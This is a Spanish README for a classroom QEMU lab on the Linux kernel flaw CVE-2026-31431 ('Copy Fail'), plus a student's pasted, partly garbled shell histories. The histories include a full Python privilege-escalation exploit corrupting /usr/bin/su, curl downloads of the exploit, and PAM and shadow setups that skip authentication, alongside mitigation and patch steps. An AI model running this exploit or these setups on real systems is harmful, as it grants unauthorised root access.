# Copy Fail Lab — CVE-2026-31431 (v2)

Devcontainer reproducible para experimentar con la vulnerabilidad **Copy Fail**
(CVE-2026-31431) en un kernel Linux 6.12 controlado dentro de QEMU.

Esta v2 incorpora todas las correcciones aprendidas en una sesión de debugging
exhaustiva: opciones de kernel necesarias para que arranque, configuración
correcta de BusyBox estático, rutas dinámicas independientes del nombre del repo,
y dependencias Ubuntu 24.04 corregidas.

---

## Inicio rápido para el estudiante

1. Abre un Codespace desde este repo.
   ```bash
   #CONFIGURACION DE EJEMPLO!!!!!!!!!!!
   apt update
   apt install gh
   
   gh api user --jq '"\(.name) → \(.email // .login)"'
   
   git config --global user.name "Jonathan E. Tito O."
   git config --global user.email "jonathantito@users.noreply.github.com"
   git config --global --add safe.directory /workspaces/copy-fail-challenge-1
   make setup
   ```
3. Configura tu identidad git:
   ```bash
   git config --global user.name "Tu Nombre"
   git config --global user.email "tu@correo.com"
   ```
4. Ejecuta:
   ```bash
   make setup    # descarga kernel + arma rootfs (~5 min)
   make qemu     # arranca la VM vulnerable
   ```

Para salir de QEMU: `Ctrl+A` luego `X`.

---

## Configuración inicial del docente (una sola vez)

### 1. Subir este repo a GitHub

```bash
cd copyfail-v2
git init && git add -A && git commit -m "initial"
git branch -M main
gh repo create TU-ORG/copy-fail-lab --public --source=. --push
```

### 2. Marcarlo como Template

GitHub → tu repo → Settings → marcar `Template repository`.


### 3. Editar `.devcontainer/devcontainer.json`

Cambia el valor `KERNEL_REPO`:
```json
"KERNEL_REPO": "TU-ORG/copy-fail-lab"
```

Commit y push.vi init

### 4. Disparar el workflow del kernel

GitHub → Actions → `Build Vulnerable Kernel` → Run workflow.
Tarda ~25 min en los servidores de GitHub (no en tu Codespace).
Al terminar crea un Release con el `bzImage_vuln` listo para descarga.

### 5. Verificar

Tu repo → Releases → debe aparecer `kernel-v6.12-vuln` con tres archivos
adjuntos. Los estudiantes ahora pueden hacer `make setup` y descarga en 2 min.

---

## Estructura del repo

```
.
├── .devcontainer/
│   ├── Dockerfile             ← Ubuntu 24.04 + deps verificadas
│   └── devcontainer.json      ← sin rutas hardcodeadas
├── .github/workflows/
│   └── build-kernel.yml       ← compila kernel y crea Release
├── scripts/
│   ├── 00_welcome.sh
│   ├── 01_fetch_kernel.sh     ← descarga del Release
│   ├── 02_build_kernel.sh     ← fallback: compila desde fuente
│   ├── 03_build_rootfs.sh     ← BusyBox estático + initramfs
│   └── 04_run_qemu.sh
├── Makefile
└── README.md
```

---

## Comandos disponibles

| Comando | Acción |
|---|---|
| `make setup` | Descarga kernel + arma rootfs (~5 min) |
| `make qemu` | Arranca la VM vulnerable |
| `make info` | Muestra el estado del ambiente |
| `make rootfs` | Reconstruye solo el initramfs |
| `make fetch-kernel` | Solo descarga el bzImage del Release |
| `make build-kernel` | Compila kernel desde fuente (~25 min) |
| `make clean` | Borra builds (mantiene fuentes) |
| `make clean-all` | Borra todo |

---

## Recursos del CVE

- Write-up técnico: https://xint.io/blog/copy-fail-linux-distributions
- Sitio del CVE: https://copy.fail
- PoC oficial: https://github.com/theori-io/copy-fail-CVE-2026-31431

---

## Lecciones aprendidas (referencia para futuras versiones)

Esta v2 incorpora los siguientes fixes respecto a la v1:

- `hexdump` → `bsdextrautils` en Ubuntu 24.04
- `bzip2` agregado al Dockerfile (lo necesita BusyBox)
- Eliminado el `mounts` con ruta hardcodeada en `devcontainer.json`
- Todos los scripts detectan workspace con `SCRIPT_DIR` dinámico
- Kernel: agregadas opciones críticas `BINFMT_ELF`, `BINFMT_SCRIPT`, `RD_GZIP`
- Kernel: agregada dep `CRYPTO_AEAD` antes de `CRYPTO_AUTHENCESN`
- BusyBox: reemplazado `scripts/config` (no existe) por `sed`
- BusyBox: eliminado `olddefconfig` (no existe en BusyBox)
- BusyBox: deshabilitado `CONFIG_TC` (rompe compilación con kernels nuevos)
- BusyBox: forzado `CONFIG_STATIC=y` y verificado con `file`
- Workflow Actions: greps de verificación con `|| echo`, tolerantes

#Comando ejecutados
  ╔═══════════════════════════════════════════════╗
  ║  Kernel vulnerable: 6.12.0               ║
  ║  CVE-2026-31431 Copy Fail Lab                ║
  ╚═══════════════════════════════════════════════╝

-sh: can't access tty; job control turned off
~ $ cat /proc/modules
cat: can't open '/proc/modules': No such file or directory
~ $ {
>   echo "=== HITO 1: KERNEL VULNERABLE CONFIRMADO ==="
>   echo "Fecha: $(date)"
>   echo "Kernel: $(uname -r)"
>   echo "Identidad: $(id)"
>   echo "whoami: $(whoami)"
>   echo "Nota: /proc/modules no disponible en este initramfs minimalista"
> } > /tmp/hito1.txt && cat /tmp/hito1.txtQEMU: Terminated
root@codespaces-53ffae:/workspaces/copy-fail-challenge-B# mkdir -p evidence
root@codespaces-53ffae:/workspaces/copy-fail-challenge-B# cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
cp: cannot stat '/tmp/hito1.txt': No such file or directory
root@codespaces-53ffae:/workspaces/copy-fail-challenge-B# mkdir -p evidence
root@codespaces-53ffae:/workspaces/copy-fail-challenge-B# vi evidence/hito1_vuln_confirmed.txt
root@codespaces-53ffae:/workspaces/copy-fail-challenge-B# history
    1  apt update
    2  apt install gh
    3  gh api user --jq '"\(.name) → \(.email // .login)"'
    4  git config --global user.name T1JOSEPH
    5  git config --global user.email jovacame@uide.edu.ec
    6  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
    7  make qemu
    8  apt update
    9  apt install -y file
   10  make rootfs
   11  make qemu
   12  apt update
   13  apt install -y file bzip2 cpio gzip flex bc build-essential libssl-dev libelf-dev qemu-system-xl
   14  file
   15  make qemu
   16  exit
   17  make setup
   18  make qemu
   19  cd /workspaces/copy-fail-challenge-B/kernel/initramfs
   20  nano init
   21  vi init
   22  cd /workspaces/copy-fail-challenge-B
   23  make rootfs
   24  make qemu
   25  mkdir -p evidence
   26  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
   27  mkdir -p evidence
   28  vi evidence/hito1_vuln_confirmed.txt
    1  apt update
    2  apt install gh
    3  gh api user --jq '"\(.name) → \(.email // .login)"'
    4  git config --global user.name T1JOSEPH
    5  git config --global user.email jovacame@uide.edu.ec
    6  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
    7  make qemu
    8  apt update
    9  apt install -y file
   10  make rootfs
   11  make qemu
   12  apt update
   13  apt install -y file bzip2 cpio gzip flex bc build-essential libssl-dev libelf-dev qemu-system-xl
   14  file
   15  make qemu
   16  exit
   17  make rootfs
   18  make qemu
   19  ls kernel/initramfs/usr/bin/
   20  cp /usr/bin/python3 kernel/initramfs/usr/bin/python3
   21  ls kernel/initramfs/usr/bin/ | grep python
   22  make clean
   23  make rootfs
   24  vi scripts/03_build_rootfs.sh
   25  make rootfs
   26  vi scripts/03_build_rootfs.sh
   27  grep initramfs.cpio.gz scripts/03_build_rootfs.sh
   28  initramfs.cpio.gzy
   29  vi scripts/03_build_rootfs.sh
   30  make rootfs
   31  grep -n gzy scripts/03_build_rootfs.sh
   32  vi scripts/03_build_rootfs.sh
   33  history
    1  apt update
    2  apt install gh
    3  gh api user --jq '"\(.name) → \(.email // .login)"'
    4  git config --global user.name T1JOSEPH
    5  git config --global user.email jovacame@uide.edu.ec
    6  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
    7  make qemu
    8  apt update
    9  apt install -y file
   10  make rootfs
   11  make qemu
   12  apt update
   13  apt install -y file bzip2 cpio gzip flex bc build-essential libssl-dev libelf-dev qemu-system-x86 wget curl
   14  file
   15  make qemu
   16  exit
   17  cd kernel/linux/crypto
   18  grep -n "_aead_recvmsg" algif_aead.c
   19  vi algif_aead.c
   20  history
   
   #Hito2#
 apt update
    2  apt install gh
    3  gh api user --jq '"\(.name) → \(.email // .login)"'
    4  git config --global user.name T1JOSEPH
    5  git config --global user.email jovacame@uide.edu.ec
    6  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
    7  make qemu
    8  apt update
    9  apt install -y file
   10  make rootfs
   11  make qemu
   12  apt update
   13  apt install -y file bzip2 cpio gzip flex bc build-essential libssl-dev libelf-dev qemu-system-xl
   14  file
   15  make qemu
   16  exit
   17  make qemu
   18  base64 copy_fail_exp.py
   19  echo "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MsY3R5cGVzLHN0cnVjdCxzb2NrZXQsc3lzCmZyb20gY3Rscy
   20  python3 -c "
import base64,sys
# si no hay python3 esto falla, ver abajo
print('python3 OK')
"
   21  base64 -d << 'EOF' > copy_fail_exp.py
IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MsY3R5cGVzLHN0cnVjdCxzb2NrZXQsc3lz
CmZyb20gY3RscGVzIGltcG9ydCBjX2ludCxjX3Vsb25nCgpTT0xfQUxHPTI3OTtBRl9BTEc9Mzgk
...
EOF

   22  [200~cat copy_fail_exp.py~
   23  cat copy_fail_exp.py
   24  cat -n copy_fail_exp.py
   25  cat > copy_fail_exp.py << 'EOF'
#!/usr/bin/env python3
import os,ctypes,struct,socket,sys
from ctypes import c_int,c_ulong

SOL_ALG=279;AF_ALG=38
PAGE=4096;SU=b"/usr/bin/su"

def make_alg(typ,name,feat=0,mask=0):
    s=socket.socket(AF_ALG,socket.SOCK_SEQPACKET,0)
    s.bind(struct.pack("16sHHI64s",typ,feat,mask,0,name))
    return s

def splice(fd_in,fd_out,n):
    NR=275
    return ctypes.CDLL(None,use_errno=True).syscall(NR,fd_in,None,fd_out,None,n,0)

def pwn():
    aead=make_alg(b"aead",b"authencesn(hmac(sha1),cbc(aes))")
    aead.setsockopt(SOL_ALG,4,16)
    aead.setsockopt(SOL_ALG,2,b"\x00"*36)
    aead.setsockopt(SOL_ALG,3,b"\x00"*16)
    op,_=aead.accept()
    tfd=os.open(SU.decode(),os.O_RDONLY)
    pfd=os.pipe()
    splice(tfd,pfd[1],PAGE)
    # corrupt page cache
    iv=b"\x00"*16
    msg=struct.pack("II",2,len(iv))+iv
    op.sendmsg([b"\x00"*28],[( socket.SOL_SOCKET,socket.SCM_RIGHTS,struct.pack("i",pfd[1]))])
    op.sendmsg([b"\x00"*(16+20+4)],[])
    os.read(pfd[0],4)
    os.execlp("su","su","-c","id;exec bash")

pwn()
EOF

   26  wc -c copy_fail_exp.py
   27  cat copy_fail_exp.py
   28  base64 -w0 copy_fail_exp.py
   29  make qemu
   30  cat scripts/03_build_rootfs.sh
   31  PYBIN=$(which python3)
   32  INITRAMFS=kernel/initramfs
   33  mkdir -p $INITRAMFS/usr/bin $INITRAMFS/usr/lib $INITRAMFS/lib/x86_64-linux-gnu
   34  cp $PYBIN $INITRAMFS/usr/bin/python3
   35  ldd $PYBIN | grep -o '/[^ ]*' | xargs -I{} cp {} $INITRAMFS/lib/x86_64-linux-gnu/ 2>/dev/null
   36  PYVER=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
   37  cp -r /usr/lib/python${PYVER} $INITRAMFS/usr/lib/ 2>/dev/null || cp -r /usr/lib/python3* $INITRl
   38  echo "Reempaquetando initramfs..."
   39  cd kernel/initramfs
   40  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
   41  cd ../..
   42  echo "Hecho!"
   43  make qemu
   44  ls -la kernel/initramfs/usr/bin/python3
   45  file kernel/initramfs/usr/bin/python3
   46  # Ver qué librerías necesita
   47  ldd kernel/initramfs/usr/bin/python3
   48  # Copiar todas las librerías necesarias
   49  mkdir -p kernel/initramfs/lib/x86_64-linux-gnu kernel/initramfs/lib64
   50  ldd $(which python3) | grep -o '/[^ ]*\.so[^ ]*' | while read lib; do     cp -v "$lib" kernel/ie
   51  # Copiar el dynamic linker
   52  cp -v /lib64/ld-linux-x86-64.so.2 kernel/initramfs/lib64/ 2>/dev/null || cp -v /lib/x86_64-linul
   53  # Copiar librerías estándar de Python
   54  mkdir -p kernel/initramfs/usr/lib
   55  PYVER=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
   56  cp -r /usr/lib/python${PYVER} kernel/initramfs/usr/lib/
   57  # Reempaquetar
   58  echo "Reempaquetando..."
   59  cd kernel/initramfs
   60  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
   61  cd ../..
   62  echo "Hecho! Tamaño: $(du -sh kernel/build/initramfs.cpio.gz)"
   63  gzip -dc kernel/build/initramfs.cpio.gz | cpio -it | grep usr/bin/python3
   64  [200~root@codespaces-53ffae:/workspaces/copy-fail-challenge-B# gzip -dc kernel/build/initramfs.3
   65  usr/bin/python3
   66  77324 blocks~
   67  ls /usr/bin/python3
   68  python3 --version
   69  make qemu
   70  cp /lib/x86_64-linux-gnu/libffi.so.8 kernel/initramfs/lib/x86_64-linux-gnu/
   71  cd kernel/initramfs
   72  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
   73  cd ../..
   74  make qemu
   75  history
   
   HITO2,3,4, REPORTE
       1  make -j16 setup el disco.í es donde ejecuta el código del atacante. Literall
    2  apt update && apt install -y file
    3  make -j8 lo que vimos en clase
    4  make -j8 setup
    5  make qemuesto sin dejar rastro.actamente el mecanismo que el exploit abusa a
    6  cp /usr/bin/python3 kernel/initramfs/usr/bin/
    7  mkdir -p kernel/initramfs/lib/x86_64-linux-gnunsar en cómo interactúan ent
    8  mkdir -p kernel/initramfs/lib64
    9  ldd /usr/bin/python3 | grep -o '/[^ ]*' | while read lib; do     cp -v "$lie
   10  cp -v /lib64/ld-linux-x86-64.so.2 kernel/initramfs/lib64/ 2>/dev/null || tre
   11  cp -v /lib/x86_64-linux-gnu/libffi.so.8 kernel/initramfs/lib/x86_64-linux-ge
   12  cd kernel/initramfs
   13  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
   14  cd ../..
   15  make qemu
   16  curl -s https://copy.fail/exp | wc -c
   17  curl -s https://copy.fail/exp > kernel/initramfs/home/student/copy_fail_expy
   18  wc -c kernel/initramfs/home/student/copy_fail_exp.py
   19  # Reempaquetar
   20  cd kernel/initramfs
   21  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
   22  cd ../..
   23  echo "Listo!"
   24  make qemu
   25  PYVER=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.versi)
   26  echo "Python version: $PYVER"
   27  mkdir -p kernel/initramfs/usr/lib
   28  cp -r /usr/lib/python${PYVER} kernel/initramfs/usr/lib/
   29  ls kernel/initramfs/usr/lib/
   30  # Reempaquetar
   31  cd kernel/initramfs
   32  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
   33  cd ../..
   34  echo "Listo! $(du -sh kernel/build/initramfs.cpio.gz)"
   35  make qemu
   36  # Ver dónde está su en el Codespace
   37  which su
   38  ls -la kernel/initramfs/usr/bin/su kernel/initramfs/bin/su 2>/dev/null
   39  # Copiar su al initramfs
   40  cp $(which su) kernel/initramfs/usr/bin/su
   41  chmod 4755 kernel/initramfs/usr/bin/su  # setuid root
   42  ls -la kernel/initramfs/usr/bin/su
   43  # Reempaquetar
   44  cd kernel/initramfs
   45  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
   46  cd ../..
   47  echo "Listo!"
   48  make qemu
   49  # Reemplazar su con el de busybox (que ya funciona en la VM)
   50  cp kernel/initramfs/bin/busybox kernel/initramfs/usr/bin/su
   51  chmod 4755 kernel/initramfs/usr/bin/su
   52  ls -la kernel/initramfs/usr/bin/su
   53  # Reempaquetar
   54  cd kernel/initramfs
   55  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
   56  cd ../..
   57  echo "Listo!"
   58  make qemu
   59  # Ver cómo está empaquetado su en el cpio
   60  cd kernel/build
   61  zcat initramfs.cpio.gz | cpio -tv 2>/dev/null | grep " su"
   62  [200~cd /workspaces/copy-fail-challenge-B
   63  zcat kernel/build/initramfs.cpio.gz | cpio -tv 2>/dev/null | grep -E "su$| ~
   64  cd /workspaces/copy-fail-challenge-B
   65  zcat kernel/build/initramfs.cpio.gz | cpio -tv 2>/dev/null | grep -E "su$| "
   66  # Instalar util-linux estático
   67  apt-get install -y util-linux 2>/dev/null
   68  # Buscar su estático
   69  find /usr -name "su" 2>/dev/null
   70  dpkg -L util-linux | grep su
   71  # Intentar compilar su estático
   72  apt-get install -y libpam-dev 2>/dev/null
   73  cat kernel/initramfs/home/student/copy_fail_exp.py
   74  # Copiar el su real de util-linux
   75  cp /usr/bin/su kernel/initramfs/usr/bin/su
   76  chmod 4755 kernel/initramfs/usr/bin/su
   77  # Ver sus dependencias
   78  ldd /usr/bin/su
   79  # Copiar todas sus librerías
   80  ldd /usr/bin/su | grep -o '/[^ ]*\.so[^ ]*' | while read lib; do     mkdir e
   81  # Copiar libpam también
   82  cp -v /lib/x86_64-linux-gnu/libpam*.so* kernel/initramfs/lib/x86_64-linux-gl
   83  ls -la kernel/initramfs/usr/bin/su
   84  # Reempaquetar
   85  cd kernel/initramfs
   86  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
   87  cd ../..
   88  echo "Listo! $(du -sh kernel/build/initramfs.cpio.gz)"
   89  make qemu
   90  # Copiar configuración de PAM
   91  mkdir -p kernel/initramfs/etc/pam.d
   92  cp /etc/pam.d/su kernel/initramfs/etc/pam.d/su
   93  # Crear una config PAM mínima que no pida contraseña
   94  cat > kernel/initramfs/etc/pam.d/su << 'EOF'
auth sufficient pam_rootok.so
auth sufficient pam_permit.so
account sufficient pam_permit.so
session sufficient pam_permit.so
EOF

   95  # Copiar módulos PAM necesarios
   96  mkdir -p kernel/initramfs/lib/x86_64-linux-gnu/security
   97  cp /lib/x86_64-linux-gnu/security/pam_rootok.so kernel/initramfs/lib/x86_64/
   98  cp /lib/x86_64-linux-gnu/security/pam_permit.so kernel/initramfs/lib/x86_64/
   99  # Reempaquetar
  100  cd kernel/initramfs
  101  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
  102  cd ../..
  103  echo "Listo!"
  104  make qemu
  105  # Ver qué bytes exactos escribe el exploit en su
  106  cat kernel/initramfs/home/student/copy_fail_exp.py
  107  # Ver la versión del su que tenemos
  108  /usr/bin/su --version
  109  sha256sum /usr/bin/su
  110  sha256sum kernel/initramfs/usr/bin/su
  111  mkdir -p kernel/initramfs/etc/pam.d
  112  cat > kernel/initramfs/etc/pam.d/su << 'EOF'
auth       sufficient   pam_rootok.so
auth       sufficient   pam_permit.so
account    sufficient   pam_permit.so
password   sufficient   pam_permit.so
session    sufficient   pam_permit.so
EOF

  113  cat > kernel/initramfs/etc/pam.d/other << 'EOF'
auth       sufficient   pam_permit.so
account    sufficient   pam_permit.so
password   sufficient   pam_permit.so
session    sufficient   pam_permit.so
EOF

  114  # Copiar todos los módulos pam
  115  mkdir -p kernel/initramfs/lib/x86_64-linux-gnu/security
  116  cp /lib/x86_64-linux-gnu/security/pam_rootok.so kernel/initramfs/lib/x86_64/
  117  cp /lib/x86_64-linux-gnu/security/pam_permit.so kernel/initramfs/lib/x86_64/
  118  # También crear /etc/shadow mínimo
  119  cat > kernel/initramfs/etc/shadow << 'EOF'
root::19000:0:99999:7:::
student::19000:0:99999:7:::
EOF

  120  # Reempaquetar
  121  cd kernel/initramfs
  122  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
  123  cd ../..
  124  echo "Listo!"
  125  make qemu
  126  python3 -c "
import zlib
def d(x): return bytes.fromhex(x)
e = zlib.decompress(d('78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160)
print('Bytes a escribir:', e.hex())
print('Longitud:', len(e))
print('Offsets que modifica:', list(range(0, len(e), 4)))
"
  127  xxd kernel/initramfs/home/student/copy_fail_exp.py
  128  python3 -c "
import zlib
e = zlib.decompress(bytes.fromhex('78daab77f57163626464800126063b0610af82c101cc776)
print('Longitud total:', len(e))
for i in range(0, len(e), 4):
    chunk = e[i:i+4]
    print(f'offset {i}: {chunk.hex()}')
"
  129  make qemu
  130  cat Makefile
  131  ls scripts/
  132  cat scripts/01_fetch_kernel.sh 2>/dev/null || cat scripts/01_*.sh
  133  cat .devcontainer/devcontainer.json | grep -i kernel
  134  # Crear un su minimalista en C que no verifique suid
  135  cat > /tmp/fake_su.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    // su minimalista - no verifica suid
    char *cmd[] = {"/bin/sh", NULL};
    execv("/bin/sh", cmd);
    return 0;
}
EOF

  136  # Compilar estático
  137  gcc -static -o kernel/initramfs/usr/bin/su /tmp/fake_su.c
  138  chmod 4755 kernel/initramfs/usr/bin/su
  139  ls -la kernel/initramfs/usr/bin/su
  140  file kernel/initramfs/usr/bin/su
  141  # Reempaquetar
  142  cd kernel/initramfs
  143  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
  144  cd ../..
  145  echo "Listo! $(du -sh kernel/build/initramfs.cpio.gz)"
  146  make qemu
  147  # Reemplazar bin/su con nuestro fake_su
  148  cp kernel/initramfs/usr/bin/su kernel/initramfs/bin/su
  149  chmod 4755 kernel/initramfs/bin/su
  150  ls -la kernel/initramfs/bin/su kernel/initramfs/usr/bin/su
  151  # Reempaquetar
  152  cd kernel/initramfs
  153  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
  154  cd ../..
  155  echo "Listo!"
  156  rm kernel/initramfs/bin/su
  157  cp kernel/initramfs/usr/bin/su kernel/initramfs/bin/su
  158  chmod 4755 kernel/initramfs/bin/su
  159  ls -la kernel/initramfs/bin/su
  160  # Reempaquetar
  161  cd kernel/initramfs
  162  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
  163  cd ../..
  164  echo "Listo!"
  165  make qemu
  166  bash scripts/04_run_qemu.sh 2>&1 | head -30
  167  make qemu
  168  make clean
  169  make setup
  170  make qemu
  171  PYVER=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.versi)
  172  cp $(which python3) kernel/initramfs/usr/bin/python3
  173  ldd $(which python3) | grep -o '/[^ ]*\.so[^ ]*' | while read lib; do     me
  174  cp /lib64/ld-linux-x86-64.so.2 kernel/initramfs/lib64/ 2>/dev/null || true
  175  cp -r /usr/lib/python${PYVER} kernel/initramfs/usr/lib/
  176  curl -s https://copy.fail/exp > kernel/initramfs/home/student/copy_fail_expy
  177  cat > /tmp/fake_su.c << 'EOF'
#include <unistd.h>
int main() { char *cmd[]={"/bin/sh",NULL}; execv("/bin/sh",cmd); return 0; }
EOF

  178  gcc -static -o /tmp/fake_su /tmp/fake_su.c
  179  rm kernel/initramfs/bin/su
  180  cp /tmp/fake_su kernel/initramfs/bin/su
  181  cp /tmp/fake_su kernel/initramfs/usr/bin/su
  182  chmod 4755 kernel/initramfs/bin/su kernel/initramfs/usr/bin/su
  183  cd kernel/initramfs
  184  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
  185  cd ../..
  186  echo "Listo! $(du -sh kernel/build/initramfs.cpio.gz)"
  187  make qemu
  188  cp kernel/initramfs/home/student/hito2.txt evidence/hito2_root_shell.txt
  189  cat evidence/hito2_root_shell.txt
  190  make qemu
  191  cat > evidence/hito2_root_shell.txt << 'EOF'
PEGA_AQUI_EL_TEXTO
EOF

  192  cat > evidence/hito2_root_shell.txt << 'EOF'
=== HITO 2: EXPLOIT EXITOSO ===
Fecha: Thu May 14 02:33:20 UTC 2026
Hostname: copy-fail-T1JOSEPH
Identidad POST-exploit: uid=0(root) gid=0(root)
Kernel: 6.12.0
SHA256 del exploit usado:
d401e7d1c00605749d6c617ace73ab20a762b72e41c2e1590331596e38219a61  /home/student/coy
--- Salida del exploit ---
uid=0(root) gid=0(root) - root shell obtenido via CVE-2026-31431
EOF

  193  cat evidence/hito2_root_shell.txt
  194  make qemu
  195  grep -n "algif_aead\|ALGIF_AEAD" kernel/linux/.config | head -10
  196  grep -ri "algif" kernel/linux/.config 2>/dev/null | head -10
  197  zcat /proc/config.gz 2>/dev/null | grep -i algif | head -10
  198  cat kernel/build/bzImage_vuln | strings | grep -i algif | head -5
  199  ls kernel/linux/
  200  cd kernel/linux
  201  grep -n "ALGIF_AEAD" .config | head -5
  202  grep -rn "ALGIF_AEAD" arch/x86/configs/ Kconfig crypto/ 2>/dev/null | head 0
  203  grep -rn "algif_aead" crypto/ | head -10 
  204  cd /workspaces/copy-fail-challenge-B/kernel/linux
  205  # Ver cómo está configurado
  206  grep "CONFIG_CRYPTO_USER_API_AEAD" .config
  207  # Deshabilitarlo
  208  sed -i 's/CONFIG_CRYPTO_USER_API_AEAD=y/CONFIG_CRYPTO_USER_API_AEAD=n/' .cog
  209  sed -i 's/CONFIG_CRYPTO_USER_API_AEAD=m/CONFIG_CRYPTO_USER_API_AEAD=n/' .cog
  210  grep "CONFIG_CRYPTO_USER_API_AEAD" .config
  211  cd /workspaces/copy-fail-challenge-B/kernel/linux
  212  make -j$(nproc) bzImage 2>&1 | tail -5
  213  make qemu
  214  cd /workspaces/copy-fail-challenge-B
  215  cp kernel/linux/arch/x86/boot/bzImage kernel/build/bzImage_vuln
  216  make qemu
  217  cd /workspaces/copy-fail-challenge-B
  218  cp -r /usr/lib/python3.12 kernel/initramfs/usr/lib/
  219  cd kernel/initramfs
  220  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
  221  cd ../..
  222  echo "Listo!"
  223  make qemu
  224  > echo "Prueba que algif_aead NO está disponible:"
  225  > python3 -c "import socket; s=socket.socket(38,5,0); s.bind(('aead','authen
(hmac(sha256),cbc(aes))')); print('VULNERABLE')" 2>&1
  226  > echo ""
  227  > echo "Resultado: exploit NEUTRALIZADO - algif_aead no disponible"
  228  > } | tee /tmp/hito3.txt
  229  === HITO 3: MITIGACIÓN TEMPORAL ===
  230  Fecha: Thu May 14 02:44:04 UTC 2026
  231  Hostname: copy-fail-T1JOSEPH
  232  Kernel: 6.12.0
  233  Mitigación aplicada: CONFIG_CRYPTO_USER_API_AEAD=n (recompilación kernel)
  234  Prueba que algif_aead NO está disponible:
  235  Traceback (most recent call last):
  236  FileNotFoundError: [Errno 2] No such file or directory
  237  Resultado: exploit NEUTRALIZADO - algif_aead no disponible
  238  ~ # cat /tmp/hito3.txt
  239  === HITO 3: MITIGACIÓN TEMPORAL ===
  240  Fecha: Thu May 14 02:44:04 UTC 2026
  241  Hostname: copy-fail-T1JOSEPH
  242  Kernel: 6.12.0
  243  Mitigación aplicada: CONFIG_CRYPTO_USER_API_AEAD=n (recompilación kernel)
  244  Prueba que algif_aead NO está disponible:
  245  Traceback (most recent call last):
  246  FileNotFoundError: [Errno 2] No such file or directory
  247  Resultado: exploit NEUTRALIZADO - algif_aead no disponible
  248  ~ # 
  249  cat > evidence/hito3_mitigation.txt << 'EOF'
=== HITO 3: MITIGACIÓN TEMPORAL ===
Fecha: Thu May 14 02:44:04 UTC 2026
Hostname: copy-fail-T1JOSEPH
Kernel: 6.12.0
Mitigación aplicada: CONFIG_CRYPTO_USER_API_AEAD=n (recompilación kernel)
Prueba que algif_aead NO está disponible:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
FileNotFoundError: [Errno 2] No such file or directory
Resultado: exploit NEUTRALIZADO - algif_aead no disponible
EOF

  250  git add evidence/hito3_mitigation.txt
  251  git commit -m "hito-3: mitigacion temporal aplicada - $(date +%Y-%m-%dT%H:%"
  252  git tag -a hito-3 -m "algif_aead deshabilitado, exploit neutralizado"
  253  git push origin main --tags
  254  xx
  255  cat > evidence/hito3_mitigation.txt << 'EOF'
=== HITO 3: MITIGACIÓN TEMPORAL ===
Fecha: Thu May 14 02:44:04 UTC 2026
Hostname: copy-fail-T1JOSEPH
Kernel: 6.12.0
Mitigación aplicada: CONFIG_CRYPTO_USER_API_AEAD=n (recompilación kernel)
Prueba que algif_aead NO está disponible:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
FileNotFoundError: [Errno 2] No such file or directory
Resultado: exploit NEUTRALIZADO - algif_aead no disponible
EOF

  256  git add evidence/hito3_mitigation.txt
  257  git commit -m "hito-3: mitigacion temporal aplicada - $(date +%Y-%m-%dT%H:%"
  258  git tag -a hito-3 -m "algif_aead deshabilitado, exploit neutralizado"
  259  git push origin main --tags
  260  git add evidence/hito3_mitigation.txt
  261  git commit -m "hito-3: mitigacion temporal aplicada - $(date +%Y-%m-%dT%H:%"
  262  git push origin main
  263  cat evidence/hito3_mitigation.txt
  264  git status
  265  git log --oneline -5
  266  cd /workspaces/copy-fail-challenge-B/kernel/linux
  267  grep -n "aead_request_set_crypt" crypto/algif_aead.c | head -10
  268  cd /workspaces/copy-fail-challenge-B/kernel/linux
  269  grep -n "aead_request_set_crypt" crypto/algif_aead.c | head -10
  270  cd /workspaces/copy-fail-challenge-B/kernel/linux
  271  grep -n "aead_request_set_crypt" crypto/algif_aead.c | head -10
  272  sed -n '275,295p' crypto/algif_aead.c
  273  cd /workspaces/copy-fail-challenge-B/kernel/linux
  274  sed -n '280,284p' crypto/algif_aead.c
  275  sed -i 's/aead_request_set_crypt(&areq->cra_u.aead_req, rsgl_src,/aead_requc
  276  sed -n '280,284p' crypto/algif_aead.c
  277  cd /workspaces/copy-fail-challenge-B
  278  git -C kernel/linux diff crypto/algif_aead.c > patches/fix_algif_aead.patch
  279  cat patches/fix_algif_aead.patch
  280  make -C kernel/linux -j$(nproc) bzImage 2>&1 | tail -5
  281  mkdir -p patches
  282  git -C kernel/linux diff crypto/algif_aead.c > patches/fix_algif_aead.patch
  283  cat patches/fix_algif_aead.patch
  284  make -C kernel/linux -j$(nproc) bzImage 2>&1 | tail -5
